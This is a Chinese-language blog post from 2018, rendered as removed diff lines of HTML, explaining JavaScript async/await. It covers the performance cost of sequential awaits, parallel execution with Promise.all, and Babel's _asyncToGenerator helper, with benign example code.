-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2018-05-24T11:02:18+08:00" content="2018-05-24">
-              2018-05-24
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/JavaScript/" itemprop="url" rel="index">
-                    <span itemprop="name">JavaScript</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="async-await-双刃剑"><a href="#async-await-双刃剑" class="headerlink" title="async/await 双刃剑"></a>async/await 双刃剑</h1><h2 id="async-await：继续-promise、Generator-之后-es7-提出的异步操作的解决方案"><a href="#async-await：继续-promise、Generator-之后-es7-提出的异步操作的解决方案" class="headerlink" title="async/await：继续 promise、Generator 之后 es7 提出的异步操作的解决方案"></a>async/await：继续 promise、Generator 之后 es7 提出的异步操作的解决方案</h2><h3 id="我们之前写回调是这样的"><a href="#我们之前写回调是这样的" class="headerlink" title="我们之前写回调是这样的"></a>我们之前写回调是这样的</h3><pre><code>// 通常写法
-a(() =&gt; {
-    b(() =&gt; {
-        c()
-    })
-})
-
-// promise
-new Promise(function (resolve, reject) {
-    resolve()
-}).then(function () {
-    return new Promise(function (resolve, reject) {
-        resolve()
-    });
-}).then(function () {
-});
-</code></pre><h3 id="async-await-写法"><a href="#async-await-写法" class="headerlink" title="async/await 写法"></a>async/await 写法</h3><pre><code>// 是不是很清新
-(async () =&gt; {
-    await a()
-    await b()
-    await c()
-})()
-</code></pre><h3 id="async-await-描述"><a href="#async-await-描述" class="headerlink" title="async/await 描述"></a>async/await 描述</h3><ul>
-<li><p>当调用一个 async 函数时，会返回一个 Promise 对象。当这个 async 函数返回一个值时，Promise 的 resolve 方法会负责传递这个值；当 async 函数抛出异常时，Promise 的 reject 方法也会传递这个异常值。（可以用.then 接收 return 值 或 遇到 reject直接用 .catch 抓取）</p>
-</li>
-<li><p>async 函数中可能会有 await 表达式，这会使 async 函数暂停执行，等待表达式中的 Promise 解析完成后继续执行 async 函数并返回解决结果</p>
-</li>
-</ul>
-<h3 id="一些优点："><a href="#一些优点：" class="headerlink" title="一些优点："></a>一些优点：</h3><ul>
-<li>使用Async/Await明显节约了不少代码。我们不需要写.then，不需要写匿名函数处理 Promise 的 resolve值，也不需要定义多余的 data 变量，还避免了嵌套代码。这些小的优点会迅速累计起来，这在之后的代码示例中会更加明显</li>
-<li>Generator 函数的执行必须靠执行器，所以才有了co 模块，而async函数自带执行器。也就是说，async函数的执行，与普通函数一模一样，只要一行。</li>
-<li>更好的语义，更广的适用性，await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）</li>
-</ul>
-<h2 id="一些使用中的问题："><a href="#一些使用中的问题：" class="headerlink" title="一些使用中的问题："></a>一些使用中的问题：</h2><h3 id="下面是随处可见的前端代码"><a href="#下面是随处可见的前端代码" class="headerlink" title="下面是随处可见的前端代码"></a>下面是随处可见的前端代码</h3><pre><code>// 先写ABCD4个列表请求
-
-function getAList() {
-    return new Promise((resolve) =&gt; {
-        setTimeout(() =&gt; {
-            resolve()
-        }, 3000)
-    }).then(() =&gt; {
-        console.log(&quot;getAList&quot;)
-    })
-}
-
-function getBList() {
-    return new Promise((resolve) =&gt; {
-        setTimeout(() =&gt; {
-            resolve()
-        }, 3000)
-    }).then(() =&gt; {
-        console.log(&quot;getBList&quot;)
-    })
-}
-
-function getCList() {
-    return new Promise((resolve) =&gt; {
-        setTimeout(() =&gt; {
-            resolve()
-        }, 3000)
-    }).then(() =&gt; {
-        console.log(&quot;getCList&quot;)
-    })
-}
-
-function getDList() {
-    return new Promise((resolve) =&gt; {
-        setTimeout(() =&gt; {
-        resolve()
-        }, 3000)
-    }).then(() =&gt; {
-        console.log(&quot;getDList&quot;)
-    })
-}
-
-// 一个页面发送 getAList getBList 两个请求之后进行的渲染
-(async () =&gt; {
-    console.time(&quot;Time&quot;)
-    await getAList()
-    await getBList()
-    console.log(&quot;finish&quot;)
-    console.timeEnd(&quot;Time&quot;)
-})()
-// 用时 6ms
-</code></pre><ul>
-<li>当 getAList 和 getBList 之间没有依赖的时候顺序的 await 会最多让执行时间增加一倍的 getAList 函数时间（如果 getBList 的执行时间大于 getAList 的执行时间）,因为 getAList 与 getBList 应该并行执行。</li>
-</ul>
-<h3 id="正确的做法应该是先同时执行函数，再-await-返回值，这样可以并行执行异步函数"><a href="#正确的做法应该是先同时执行函数，再-await-返回值，这样可以并行执行异步函数" class="headerlink" title="正确的做法应该是先同时执行函数，再 await 返回值，这样可以并行执行异步函数:"></a>正确的做法应该是先同时执行函数，再 await 返回值，这样可以并行执行异步函数:</h3><pre><code>(async () =&gt; {
-    console.time(&quot;Time&quot;)
-    const getAListResult = getAList()
-    const getBListResult = getBList()
-    await getAListResult
-    await getBListResult
-    console.log(&quot;finish&quot;)
-    console.timeEnd(&quot;Time&quot;)
-})()
-// 用时 3ms
-
-
-// Promise.all 写法并发执行多个 promise
-(async () =&gt; {
-    console.time(&quot;Time&quot;)
-    Promise.all([getAList(), getBList()]).then(() =&gt; {
-    console.log(&quot;finish&quot;)
-    console.timeEnd(&quot;Time&quot;)
-    })
-})()
-// 用时 3ms
-</code></pre><h2 id="看来不要随意的-await，它很可能让你的代码性能降低！！！"><a href="#看来不要随意的-await，它很可能让你的代码性能降低！！！" class="headerlink" title="看来不要随意的 await，它很可能让你的代码性能降低！！！"></a><em>看来不要随意的 await，它很可能让你的代码性能降低！！！</em></h2><h3 id="async-await-语法糖只能实现一部分回调支持的功能，也就是仅能方便应对层层嵌套的场景。其他场景，就要动一些脑子了，比如两对回调："><a href="#async-await-语法糖只能实现一部分回调支持的功能，也就是仅能方便应对层层嵌套的场景。其他场景，就要动一些脑子了，比如两对回调：" class="headerlink" title="async/await 语法糖只能实现一部分回调支持的功能，也就是仅能方便应对层层嵌套的场景。其他场景，就要动一些脑子了，比如两对回调："></a>async/await 语法糖只能实现一部分回调支持的功能，也就是仅能方便应对层层嵌套的场景。其他场景，就要动一些脑子了，比如两对回调：</h3><pre><code>a(() =&gt; {
-    b()
-})
-
-c(() =&gt; {
-    d()
-})
-</code></pre><h4 id="1-如果一不留神写成下面的方式，虽然一定能保证功能实现，但却是最低效的执行方式："><a href="#1-如果一不留神写成下面的方式，虽然一定能保证功能实现，但却是最低效的执行方式：" class="headerlink" title="1. 如果一不留神写成下面的方式，虽然一定能保证功能实现，但却是最低效的执行方式："></a>1. 如果一不留神写成下面的方式，虽然一定能保证功能实现，但却是最低效的执行方式：</h4><pre><code>await a();
-await b();
-await c();
-await d();
-
-// 因为翻译成回调，就变成了下面这样，async/await 会让我们倾向于在 b 执行完后，再执行 c
-a(() =&gt; {
-    b(() =&gt; {
-        c(() =&gt; {
-            d()
-        });
-    });
-});
-</code></pre><h4 id="2-我们想到上面的例子，可以优化一下性能："><a href="#2-我们想到上面的例子，可以优化一下性能：" class="headerlink" title="2. 我们想到上面的例子，可以优化一下性能："></a>2. 我们想到上面的例子，可以优化一下性能：</h4><pre><code>const resA = a();
-const resC = c();
-await resA;
-b();
-await resC;
-d();
-
-// 但是，d 原本只要等待 c 执行完，现在如果 a 执行时间比 c 长，就变成了这样：
-a(() =&gt; {
-    d();
-});
-</code></pre><h4 id="3-看来只有完全隔离成两个函数："><a href="#3-看来只有完全隔离成两个函数：" class="headerlink" title="3. 看来只有完全隔离成两个函数："></a>3. 看来只有完全隔离成两个函数：</h4><pre><code>(async () =&gt; {
-    await a();
-    b();
-})()
-
-(async () =&gt; {
-    await c();
-    d();
-})();
-</code></pre><h4 id="4-或者利用-Promise-all"><a href="#4-或者利用-Promise-all" class="headerlink" title="4. 或者利用 Promise.all"></a>4. 或者利用 Promise.all</h4><pre><code>const ab = async () =&gt; {
-    await getAList();
-    getBList();
-}
-const cd = async () =&gt; {
-    await getCList();
-    getDList();
-}
-Promise.all([ab(), cd()])
-</code></pre><h3 id="现在我们回头来看一下原来两对的回调函数："><a href="#现在我们回头来看一下原来两对的回调函数：" class="headerlink" title="现在我们回头来看一下原来两对的回调函数："></a>现在我们回头来看一下原来两对的回调函数：</h3><pre><code>a(() =&gt; {
-    b()
-})
-
-c(() =&gt; {
-    d()
-})
-</code></pre><h3 id="现在来看想使用好-async-await-真的会那么简单吗？回调方式这么简单的过程式代码，换成-async-await-居然写完还要反思一下，再反推着去优化性能，先不考虑写法上的繁琐与否如果一不留神影响性能这简直比回调还要可怕。希望本次分享能让大家在使用-async-await-的时候多一些思考，谢谢大家"><a href="#现在来看想使用好-async-await-真的会那么简单吗？回调方式这么简单的过程式代码，换成-async-await-居然写完还要反思一下，再反推着去优化性能，先不考虑写法上的繁琐与否如果一不留神影响性能这简直比回调还要可怕。希望本次分享能让大家在使用-async-await-的时候多一些思考，谢谢大家" class="headerlink" title="现在来看想使用好 async/await 真的会那么简单吗？回调方式这么简单的过程式代码，换成 async/await 居然写完还要反思一下，再反推着去优化性能，先不考虑写法上的繁琐与否如果一不留神影响性能这简直比回调还要可怕。希望本次分享能让大家在使用 async/await 的时候多一些思考，谢谢大家"></a>现在来看想使用好 async/await 真的会那么简单吗？回调方式这么简单的过程式代码，换成 async/await 居然写完还要反思一下，再反推着去优化性能，先不考虑写法上的繁琐与否如果一不留神影响性能这简直比回调还要可怕。希望本次分享能让大家在使用 async/await 的时候多一些思考，谢谢大家</h3><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h4 id="一下为-babel-的源码（不包含词法转换）"><a href="#一下为-babel-的源码（不包含词法转换）" class="headerlink" title="一下为 babel 的源码（不包含词法转换）:"></a>一下为 babel 的源码（不包含词法转换）:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) &#123;</span><br><span class="line">  try &#123;</span><br><span class="line">    // generator 语法</span><br><span class="line">    var info = gen[key](arg);</span><br><span class="line">    var value = info.value;</span><br><span class="line">  &#125; catch (error) &#123;</span><br><span class="line">    reject(error);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (info.done) &#123;</span><br><span class="line">    resolve(value);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    // await 后的值包装一层 promise 返回.</span><br><span class="line">    // value 为非 promise 时直接返回，value 为 promise 时则 then 之后再继续执行 generator 的 next 方法</span><br><span class="line">    Promise.resolve(value).then(_next, _throw);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _asyncToGenerator(fn) &#123;</span><br><span class="line">  return function() &#123;</span><br><span class="line">    var self = this,</span><br><span class="line">      args = arguments;</span><br><span class="line">    // async function 返回 promise 的原因</span><br><span class="line">    return new Promise(function(resolve, reject) &#123;</span><br><span class="line">      var gen = fn.apply(self, args);</span><br><span class="line"></span><br><span class="line">      function _next(value) &#123;</span><br><span class="line">        asyncGeneratorStep(gen, resolve, reject, _next, _throw, &quot;next&quot;, value);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      function _throw(err) &#123;</span><br><span class="line">        asyncGeneratorStep(gen, resolve, reject, _next, _throw, &quot;throw&quot;, err);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      _next(undefined);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports = _asyncToGenerator;</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>测试一下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">// babel</span><br><span class="line">const babelFunc = _asyncToGenerator(function* () &#123;</span><br><span class="line">  console.log(1);</span><br><span class="line">  yield new Promise(resolve =&gt; &#123;</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      resolve();</span><br><span class="line">      console.log(&apos;sleep 1s&apos;);</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">  &#125;);</span><br><span class="line">  console.log(2);</span><br><span class="line">  const a = yield Promise.resolve(&apos;a&apos;);</span><br><span class="line">  const b = yield Promise.resolve(&apos;b&apos;);</span><br><span class="line">  const c = yield Promise.resolve(&apos;c&apos;);</span><br><span class="line">  console.log(3);</span><br><span class="line">  return [a, b, c];</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">babelFunc().then(res =&gt; &#123;</span><br><span class="line">  console.log(res)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// async await</span><br><span class="line">const asyncFunc = async () =&gt; &#123;</span><br><span class="line">  console.log(1)</span><br><span class="line">  await new Promise((resolve) =&gt; &#123;</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      resolve()</span><br><span class="line">      console.log(&apos;1s&apos;)</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">  &#125;)</span><br><span class="line">  console.log(2)</span><br><span class="line">  const a = await Promise.resolve(&apos;a&apos;)</span><br><span class="line">  const b = await Promise.resolve(&apos;b&apos;)</span><br><span class="line">  const c = await Promise.resolve(&apos;c&apos;)</span><br><span class="line">  console.log(3)</span><br><span class="line">  return [a, b, c]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">asyncFunc().then(res =&gt; &#123;</span><br><span class="line">  console.log(res)</span><br><span class="line">&#125;)</span><br><span class="line">// 测试结果相同</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<ul>
-<li>思考一下代码的执行结果，todo: generator 源码不是一直 while 吗？<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">async function test() &#123;</span><br><span class="line">    setTimeout(() =&gt; &#123;console.log(&apos;ffff&apos;)&#125;, 2000)</span><br><span class="line">    await new Promise((resolve) =&gt; &#123;</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">            resolve()</span><br><span class="line">            console.log(&apos;10s&apos;)</span><br><span class="line">        &#125;, 10000)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 </ul>
 
           
